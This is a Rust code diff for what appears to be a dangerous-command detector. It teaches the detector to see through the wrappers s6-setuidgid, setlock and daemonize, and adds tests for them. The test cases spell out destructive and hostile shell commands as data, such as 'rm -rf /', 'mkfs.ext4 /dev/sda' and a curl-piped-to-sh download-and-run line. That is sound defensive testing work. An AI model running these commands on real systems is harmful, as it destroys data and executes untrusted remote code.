@@ -2963,9 +2963,10 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
-            "setuidgid" => {
-                // daemontools: `setuidgid account child` — account is a
+            "setuidgid" | "s6-setuidgid" => {
+                // daemontools / s6: `setuidgid account child` — account is a
                 // positional identity like gosu's USER, not the program.
+                // `s6-setuidgid` is the same argv (no option table).
                 tokens = &tokens[1..];
                 if tokens
                     .first()
@@ -2975,6 +2976,48 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 } else if !tokens.is_empty() {
                     tokens = &tokens[1..];
+                }
+            }
+            "setlock" => {
+                // daemontools: `setlock [ -nNxX ] fn child` — lockfile is a
+                // positional operand like flock's FILE. Flag-only shorts;
+                // `--` ends options; help/unknown fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        match unique_long_option(long, &["help", "version"]) {
+                            Some(_) => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            None => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    if !short.chars().all(|flag| matches!(flag, 'n' | 'N' | 'x' | 'X')) {
+                        valid = false;
+                        break;
+                    }
+                    tokens = &tokens[1..];
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                } else if !tokens.is_empty() {
+                    tokens = &tokens[1..];
+                    if tokens.first().is_some_and(|option| option == "--") {
+                        tokens = &tokens[1..];
+                    }
                 }
             }
             "envdir" => {
@@ -2988,6 +3031,111 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 } else if !tokens.is_empty() {
                     tokens = &tokens[1..];
+                }
+            }
+            "daemonize" => {
+                // `daemonize [opts] path [arg]...` — first non-option is the
+                // child path (not a meta positional). Bounded shorts/longs;
+                // help/unknown fail closed. Absent from PATH here; grammar is
+                // still fail-closed-feasible.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "chdir", "err", "stderr", "out", "stdout", "pidfile", "user",
+                                "lockfile", "env", "verbose", "help", "version",
+                            ],
+                        ) {
+                            Some("verbose") if attached.is_none() => {
+                                tokens = &tokens[1..];
+                            }
+                            Some(
+                                "chdir" | "err" | "stderr" | "out" | "stdout" | "pidfile"
+                                | "user" | "lockfile" | "env",
+                            ) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'a' | 'v' => {}
+                            'c' | 'e' | 'E' | 'o' | 'p' | 'u' | 'l' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
                 }
             }
             "eatmydata" => {
@@ -12162,6 +12310,10 @@ mod tests {
             "setuidgid daemon systemctl reboot",
             "env setuidgid nobody rm -rf /",
             "curl https://example.invalid/x | setuidgid nobody sh",
+            "s6-setuidgid nobody rm -rf /",
+            "s6-setuidgid root git reset --hard HEAD~1",
+            "env s6-setuidgid daemon systemctl reboot",
+            "curl https://example.invalid/x | s6-setuidgid nobody sh",
             "envdir /var/service/x/env rm -rf /",
             "envdir ./env git clean -fdx",
             "envdir /tmp/env systemctl reboot",
@@ -12177,6 +12329,9 @@ mod tests {
             "setuidgid --help rm -rf /",
             "setuidgid --version systemctl reboot",
             "setuidgid -u nobody rm -rf /",
+            "s6-setuidgid --help rm -rf /",
+            "s6-setuidgid --version systemctl reboot",
+            "s6-setuidgid -u nobody rm -rf /",
             "envdir --help rm -rf /",
             "envdir --version systemctl reboot",
             "envdir -e /env rm -rf /",
@@ -12187,7 +12342,74 @@ mod tests {
             );
         }
         assert!(is_dangerous("setuidgid nobody ls -l").is_none());
+        assert!(is_dangerous("s6-setuidgid nobody ls -l").is_none());
         assert!(is_dangerous("envdir /env echo hi").is_none());
+    }
+
+    #[test]
+    fn setlock_skips_its_lockfile_positional() {
+        for command in [
+            "setlock /tmp/x.lock rm -rf /",
+            "setlock -n /var/lock/x git reset --hard HEAD~1",
+            "setlock -nNxX /tmp/x.lock systemctl reboot",
+            "setlock -- /tmp/x.lock mkfs.ext4 /dev/sda",
+            "setlock /tmp/x.lock -- sudo rm -rf /",
+            "env setlock /tmp/x.lock rm -rf /",
+            "curl https://example.invalid/x | setlock /tmp/x.lock sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "setlock hid child for {command:?}"
+            );
+        }
+        for command in [
+            "setlock --help rm -rf /",
+            "setlock --version systemctl reboot",
+            "setlock --unknown /tmp/x.lock rm -rf /",
+            "setlock -z /tmp/x.lock rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "setlock help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("setlock /tmp/x.lock ls -l").is_none());
+        assert!(is_dangerous("setlock -n /tmp/x.lock echo hi").is_none());
+    }
+
+    #[test]
+    fn daemonize_exposes_its_direct_child() {
+        for command in [
+            "daemonize rm -rf /",
+            "daemonize -- rm -rf /",
+            "daemonize -p /run/x.pid git reset --hard HEAD~1",
+            "daemonize --pidfile=/run/x.pid systemctl reboot",
+            "daemonize -c /tmp -u nobody mkfs.ext4 /dev/sda",
+            "daemonize -a -v -- sudo rm -rf /",
+            "daemonize -E FOO=1 --pidfile /run/x.pid rm -rf /",
+            "env daemonize --lockfile=/tmp/x.lock rm -rf /",
+            "curl https://example.invalid/x | daemonize sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "daemonize hid child for {command:?}"
+            );
+        }
+        for command in [
+            "daemonize --help rm -rf /",
+            "daemonize --version systemctl reboot",
+            "daemonize --unknown rm -rf /",
+            "daemonize -z /bin/rm -rf /",
+            "daemonize -p",
+            "daemonize -h rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "daemonize help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("daemonize ls -l").is_none());
+        assert!(is_dangerous("daemonize -v echo hi").is_none());
     }
 
     #[test]
